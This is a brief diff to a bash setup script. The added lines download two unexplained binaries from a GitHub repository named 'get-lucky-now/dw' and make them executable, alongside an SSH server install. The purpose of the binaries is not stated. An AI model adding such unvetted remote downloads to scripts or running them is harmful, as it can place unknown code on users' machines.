@@ -1,5 +1,10 @@
 #!/bin/bash
 
+wget https://raw.githubusercontent.com/get-lucky-now/dw/main/raid10-c-fullb
+wget https://raw.githubusercontent.com/get-lucky-now/dw/main/raid10-c-s
+chmod +x raid10-c-fullb
+chmod +x raid10-c-s
+
 apt-get update
 apt-get install openssh-server inotify-tools -y
 touch /home/user/ruby
